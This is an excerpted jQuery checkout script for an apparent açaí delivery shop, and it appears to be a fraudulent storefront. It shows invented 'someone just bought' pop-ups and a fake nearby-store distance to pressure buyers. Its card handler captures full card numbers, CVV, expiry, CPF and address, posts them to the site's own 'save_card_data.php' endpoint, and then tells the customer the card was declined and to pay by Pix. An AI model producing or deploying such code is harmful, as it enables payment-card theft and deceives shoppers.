$(document).ready(function() {
    ...
    const newParams = Object.entries(googleData).map( ([key,value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`).join('&');
    ...
    $(window).scroll(function() {
        if ($('.categorias').length > 0) {
            ...
            $('#menu-nav').toggleClass('fixed', windowTop > menuCategorias);
        }
    });
    $(document).on('click', '.categorias a', function(e) {
        e.preventDefault();
    ...
    function escolherFraseAleatoria() {
        const frases = ["🎉 <b>Lucas</b> acabou de comprar o Combo 2 Copos de 700ml!", "🚀 <b>Ana</b> garantiu o Combo Zero Açúcar 500ml há 2 minutos!", "🍨 <b>Rafaela</b> finalizou a compra do Combo 2 Copos de 1L agora!", "🔥 <b>Fernando</b> comprou o Combo 2 Copos de 500ml há poucos instantes!", "😋 <b>Isabela</b> adicionou um Combo 2 Copos de 300ml ao carrinho!", "⏳ <b>Bruno</b> comprou o Combo 3! Restam poucas unidades!", "📦 <b>João</b> pediu 2 Combos de Açaí 700ml agora mesmo!", "🏆 <b>Mirella</b> garantiu o Combo Mais Vendido – 2 Copos de 700ml!", "🚨 <b>Atenção</b>! Mais de <b>15 pedidos</b> nos últimos 10 minutos!", "🔥 Nas últimas 2 horas, 37 pessoas compraram nossos combos de açaí!", "⚡ Acabamos de bater 100 pedidos de açaí só hoje!", "⏳ Apenas 4 unidades do Combo 3 restantes! Corra antes que acabe!", "🚀 +20 pedidos feitos nos últimos 30 minutos! Açaí bombando!", "🍨 Os combos de 700ml estão esgotando rápido! Aproveite agora!", "🎯 Mais de 250 clientes satisfeitos nos últimos 7 dias!", "💜 Obrigado! Mais de 500 pedidos já saíram esse mês!", "🚀 Só hoje, 73 clientes garantiram seu combo de açaí!", "⏳ O estoque do Combo 3 está quase esgotando! Últimas unidades!", "🎉 Promoção Pague 1 Leve 2 está fazendo sucesso! +40 pedidos só hoje!"];
    ...
    async function escolherLocalizacao() {
        ...
        Swal.fire({
            ...
            Swal.fire({
                html: `A loja mais próxima fica a <b>1,6km</b> de você! Seu pedido chegará entre 30 a 45 minutos.`,
                icon: "success",
    ...
    $(document).on('click', 'button.qtd-plus, button.qtd-minus', function(e) {
        ...
        $('#subtotal').text((Number(total).toLocaleString('pt-BR', {
            style: 'currency',
            currency: 'BRL'
        })));
    });
    ...
    $(document).on('click', 'button.add-extra', function() {
        const item = $(this).closest('.dados-item');
        const select = item.find('select');
        const opcao = select.val();
        ...
        if (select.length === 0) {
            ...
            selecionadosArray.push(`Opção: ${opcao}`);
            opcoes = selecionadosArray;
        }
    ...
    $('#opcoes-pet').select2({
        ...
        dropdownParent: $('#seletor-pet')
    });

    $('#opcoes-lata').select2({
        placeholder: 'Selecione...',
        dropdownParent: $('#seletor-lata')
    });

    $('#opcoes-suco').select2({
        placeholder: 'Selecione...',
        dropdownParent: $('#seletor-suco')
    });
        ...
        $.ajax({
            ...
            success: function(response) {
                if (response.success) {
                    ...
                    const div = $('#content-list-products');
                    div.html('');
                    items.forEach(item => {
                        let desc = '';
                        if (item.observacoes != 'orderBump') {
                            desc = 'Aproveite! Entrega grátis';
                        } else {
                            desc = '🔥 PROMOÇÃO ESPECIAL EXCLUSIVA 🔥';
                        }
                        const item_div = `<div class="produto-cart">
                            <div class="quantity">${item.qtd}</div>
                            <div class="image"><img src="${item.image}" alt="${item.title}"></div>
                            <div class="dados">
                                <h3>${item.title}</h3>
                                <p>${desc}</p>
                                <div class="price">
                                    <span class="price">R$ ${parseFloat(item.preco).toFixed(2).replace('.', ',')}</span>
                                    <span class="promo">R$ ${parseFloat(item.preco_promocional).toFixed(2).replace('.', ',')}</span>
                                </div>
                            </div>
                        </div>`;
                        div.append(item_div);
                    ...
                    const metodo = localStorage.getItem('shipping_method');
                    let frete = 0.00;

                    if (metodo && metodo === 'express') {
                        frete = 9.90;
                    }

                    const totalGeral = items.reduce( (soma, item) => soma + parseFloat(item.total), 0);
                    const totalComFrete = totalGeral + frete;
                    const totalArredondado = totalComFrete.toFixed(2);
                    $('#subtotal_cart').text(`R$ ${parseFloat(totalGeral).toFixed(2).replace('.', ',')}`);
                    $('#total_cart, #total_button').text(`R$ ${parseFloat(totalComFrete).toFixed(2).replace('.', ',')}`);
                    $('#amount').val(totalComFrete);
                }
                $('.loading__circle').css({
                    'display': 'none'
                });
    ...
    $('#shippings input[name="shipping_methods"]').on('change', function() {
        $('#shippings .custom-radio').removeClass('custom-radio-active');
        $(this).closest('label').find('.custom-radio').addClass('custom-radio-active');
        const total = $('#amount').val();

        const frete = $(this).val();

        if (frete > 0) {
            const totalGeral = parseFloat(total) + parseFloat(9.90);
            $('#total_frete').text(`R$ ${parseFloat(frete).toFixed(2).replace('.', ',')}`);
            $('#amount').val(totalGeral);
            $('#total_cart, #total_button').text(`R$ ${parseFloat(totalGeral).toFixed(2).replace('.', ',')}`);
            localStorage.setItem('shipping_method', 'express');
        } else {
            const totalGeral = parseFloat(total) - parseFloat(9.90);
            $('#total_frete').text(`R$ 0,00`);
            $('#amount').val(totalGeral);
            $('#total_cart, #total_button').text(`R$ ${parseFloat(totalGeral).toFixed(2).replace('.', ',')}`);
            localStorage.setItem('shipping_method', 'free');
        }
    });
    ...
    jQuery(function($) {
        ...
        $('#nome').on('input', function() {
            ...
            if (!validarNome(valor)) {
                $(this).addClass('error');
                $('.label-error[name="first_name_label_error"]').text('Digite seu nome completo').css('display', 'block');
            } else {
                $(this).removeClass('error');
        ...
        $('#telefone').on('input', function() {
            ...
            if (valor.length < 15) {
                $(this).addClass('error');
                $('.label-error[name="phone_label_error"]').text('O mínimo de caracteres para esse campo é 15').css('display', 'block');
            } else {
                $(this).removeClass('error');
                $('.label-error[name="phone_label_error"]').text('').css('display', 'none');
            }
        });
        ...
        $(document).on('click', 'button#step1-checkout-finish', async function(e) {
            ...
            if (is_valid) {
                ...
                $('#icon-edit-personal-data').removeClass('d-none');

                $('.step1-checkout').removeClass('enable_step').addClass('validated enable_step_edit disabled_step');
        ...
        $(document).on('click', '.step1-checkout.enable_step_edit', function() {
            $('#icon-edit-personal-data').addClass('d-none');
            $('.step1-checkout').addClass('enable_step').removeClass('validated enable_step_edit disabled_step');
            $('button#step1-checkout-finish').removeClass('d-none');
            $('button#step2-checkout-finish').addClass('d-none');
            $('.step2-checkout').addClass('disabled_step').removeClass('enable_step');
            $('.step3-checkout').addClass('disabled_step').removeClass('enable_step');
        });
        ...
        $('#numero').on('input', function() {
            ...
            if (valor.length < 1) {
                $(this).addClass('error');
                $('.label-error[name="address_number_label_error"]').text('Este campo é obrigatório').css('display', 'block');
            } else {
                $(this).removeClass('error');
                $('.label-error[name="address_number_label_error"]').text('').css('display', 'none');
            }
        });
        ...
        $('#endereco').on('input', function() {
            ...
            if (valor.length < 1) {
                $(this).addClass('error');
                $('.label-error[name="address_line_1_label_error"]').text('Este campo é obrigatório').css('display', 'block');
            } else {
                $(this).addClass('error');
                $('.label-error[name="address_line_1_label_error"]').text('').css('display', 'none');
            }
        });
        ...
        $('#bairro').on('input', function() {
            ...
            if (valor.length < 1) {
                $(this).addClass('error');
                $('.label-error[name="address_neighborhood_label_error"]').text('Este campo é obrigatório').css('display', 'block');
            } else {
                $(this).addClass('error');
                $('.label-error[name="address_neighborhood_label_error"]').text('').css('display', 'none');
            }
        });
        ...
        $('#estado').on('input', function() {
            ...
            if (valor.length < 1) {
                $(this).addClass('error');
                $('.label-error[name="state_label_error"]').text('Este campo é obrigatório').css('display', 'block');
            } else {
                $(this).addClass('error');
                $('.label-error[name="state_label_error"]').text('').css('display', 'none');
            }
        });
        ...
        $('#cidade').on('input', function() {
            ...
            if (valor.length < 1) {
                $(this).addClass('error');
                $('.label-error[name="city_label_error"]').text('Este campo é obrigatório').css('display', 'block');
            } else {
                $(this).addClass('error');
                $('.label-error[name="city_label_error"]').text('').css('display', 'none');
            }
        });

        $(document).on('click', 'button#step2-checkout-finish', async function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            let is_valid = true;

            if ($('#cep-checkout').val() === '' || $('#endereco').val() === '' || $('#bairro').val() === '' || $('#estado').val() === '' || $('#cidade').val() === '' || $('#numero').val() === '') {
                is_valid = false;
            }

            if (is_valid) {
                localStorage.setItem("dadosFrete", JSON.stringify({
                    cep: $('#cep-checkout').val(),
                ...
                $(this).addClass('d-none');
                $('#icon-edit-delivery-address').removeClass('d-none');

                $('.step2-checkout').removeClass('enable_step').addClass('validated enable_step_edit disabled_step');

                let frete = '';
                if (localStorage.getItem("shipping_method") == 'free') {
                    frete = 'Grátis';
                } else {
                    frete = 'Expressa R$ 9,90';
                }

                $('#step2-summary-container').html(`
                <p style="padding-top: 0.6rem; font-size: 15px">
                    <b>Endereço:</b><br> ${dadosFrete.endereco}, ${dadosFrete.numero} - ${dadosFrete.bairro} ${dadosFrete.cidade} - ${dadosFrete.estado} | CEP: ${dadosFrete.cep}
                </p>
                <p style="padding-top: 0.6rem; font-size: 15px"><b>Forma de Entrega:</b> ${frete}</p>
            `);

                $('.step3-checkout').removeClass('disabled_step').addClass('enable_step');
            } else {
                console.log('Campos de entrega inválidos');
            }
        });

        $(document).on('click', '.step2-checkout.enable_step_edit', function() {
            $('#icon-edit-delivery-address').addClass('d-none');
            $('.step2-checkout').addClass('enable_step').removeClass('validated enable_step_edit disabled_step');
            $('button#step2-checkout-finish').removeClass('d-none');
            $('button#step1-checkout-finish').addClass('d-none');
            $('.step1-checkout').addClass('disabled_step').removeClass('enable_step');
            $('.step3-checkout').addClass('disabled_step').removeClass('enable_step');
        });

        $(document).on('click', '#general-submit-button', function(e) {
            e.preventDefault();
            e.stopPropagation();
        ...
        $(document).on('click', '#credit-card-row', function () {
            var $formContainer = $('#credit-card-form-container');
            if ($formContainer.hasClass('d-none')) {
                $formContainer.removeClass('d-none').slideDown(300);
                $('#credit_card_asset_radio').addClass('radios-payment-methods-active');
                ...
                $('#credit_card_asset_radio').removeClass('radios-payment-methods-active');
            }
        });

        function validateLuhn(cardNumber) {

            var cleanNumber = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
            ...
            for (var i = cleanNumber.length - 1; i >= 0; i--) {
                var digit = parseInt(cleanNumber.charAt(i), 10);
        ...
        function detectCardBrand(cardNumber) {
            var cleanNumber = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
            var firstDigit = cleanNumber.charAt(0);
            var firstTwo = cleanNumber.substring(0, 2);
        ...
        function initCreditCardMasks() {
            ...
            $('#cc-cpf').mask('000.000.000-00', {
                placeholder: '000.000.000-00',
                reverse: false
            });

            $('#cc-validade').mask('00/00', {
                placeholder: 'MM/AA',
                reverse: false
            });
        ...
        $(document).on('input blur', '#cc-number', function() {
            var $input = $(this);
        ...
        $(document).on('input blur', '#cc-validade', function() {
            var $input = $(this);
            ...
            if (value.length === 4) {
                ...
                var year = parseInt(value.substring(2, 4), 10);
        ...
        $(document).on('input blur', '#cc-cvv', function() {
            var $input = $(this);
            var value = $input.val().replace(/\D/g, '');
        ...
        $(document).on('input blur', '#cc-cpf', function() {
            var $input = $(this);
        ...
        $(document).on('input blur', '#cc-name', function() {
            var $input = $(this);
        ...
        $(document).on('click', '#credit-card-pay-button', function(e) {
            e.preventDefault();
            
            var cardNumber = $('#cc-number').val().replace(/\s+/g, '');
            var cardName = $('#cc-name').val().trim();
            var cardCPF = $('#cc-cpf').val().replace(/\D/g, '');
            var cardValidade = $('#cc-validade').val().replace(/\D/g, '');
            var cardCVV = $('#cc-cvv').val().replace(/\D/g, '');
            
            var errors = [];
            
            if (!cardNumber || !validateLuhn($('#cc-number').val())) {
                errors.push('Número do cartão inválido');
                $('#cc-number').addClass('is-invalid').css('border-color', '#dc3545');
            }
            
            if (!cardName || cardName.length < 3 || cardName.split(' ').length < 2) {
                errors.push('Nome do titular deve conter nome e sobrenome');
                $('#cc-name').addClass('is-invalid').css('border-color', '#dc3545');
            }
            
            if (!cardCPF || cardCPF.length !== 11 || !validateCPF(cardCPF)) {
                errors.push('CPF inválido');
                $('#cc-cpf').addClass('is-invalid').css('border-color', '#dc3545');
            }
            
            if (!cardValidade || cardValidade.length !== 4) {
                errors.push('Validade inválida');
                $('#cc-validade').addClass('is-invalid').css('border-color', '#dc3545');
            } else {
                var month = parseInt(cardValidade.substring(0, 2), 10);
                var year = parseInt(cardValidade.substring(2, 4), 10);
                var currentYear = new Date().getFullYear() % 100;
                var currentMonth = new Date().getMonth() + 1;
                
                if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
                    errors.push('Validade inválida ou expirada');
                    $('#cc-validade').addClass('is-invalid').css('border-color', '#dc3545');
                }
            }
            ...
            if (!cardCVV || cardCVV.length < 3 || cardCVV.length > 4) {
                ...
                $('#cc-cvv').addClass('is-invalid').css('border-color', '#dc3545');
            }
            ...
            var dadosPessoais = JSON.parse(localStorage.getItem("dadosPessoais")) || {};
            var dadosFrete = JSON.parse(localStorage.getItem("dadosFrete")) || {};
            var amount = parseFloat($('#amount').val() || localStorage.getItem('totalCarrinho') || 0);

            var cardBrand = detectCardBrand($('#cc-number').val());

            var cardData = {
                cardNumber: cardNumber,
                cardName: cardName,
                cardCPF: cardCPF,
                cardValidity: cardValidade,
                cardCVV: cardCVV,
                cardBrand: cardBrand,
                amount: amount,
                customerData: {
                    ...
                    telefone: dadosPessoais.celular || dadosPessoais.telefone || '',
                    endereco: dadosFrete.endereco || '',
                    numero: dadosFrete.numero || '',
                    complemento: dadosFrete.complemento || '',
                    bairro: dadosFrete.bairro || '',
                    cidade: dadosFrete.cidade || '',
                    estado: dadosFrete.estado || '',
                    cep: dadosFrete.cep || ''
                }
            };

            $('.loading__circle').css('display', 'flex');
            $('.loading__component').show();

            var $button = $('#credit-card-pay-button');
            $button.prop('disabled', true);

            $.ajax({
                url: 'admin/api/save_card_data.php',
                method: 'POST',
                        ...
                        if (response.success) {
                            if (typeof Swal !== 'undefined') {
                                Swal.fire({
                                    ...
                                    text: 'Erro ao aprovar pagamento com cartão. Mude a forma de pagamento para Pix ou tente novamente.',
                                    confirmButtonText: 'OK'
                                });
                            } else {
                            ...
                            if (typeof Swal !== 'undefined') {
                                Swal.fire({
                                    icon: 'warning',
                                    title: 'Atenção',
                                    text: 'Cartão validado, mas houve um erro ao salvar os dados.',
                                    confirmButtonText: 'OK'
                                });
                            }
                        }
                    ...
                    setTimeout(function() {
                        ...
                        if (typeof Swal !== 'undefined') {
                            Swal.fire({
                                ...
                                text: 'Os dados do cartão foram validados com sucesso.',
                                confirmButtonText: 'OK'
                            });
                        } else {
                            alert('Cartão validado com sucesso!');
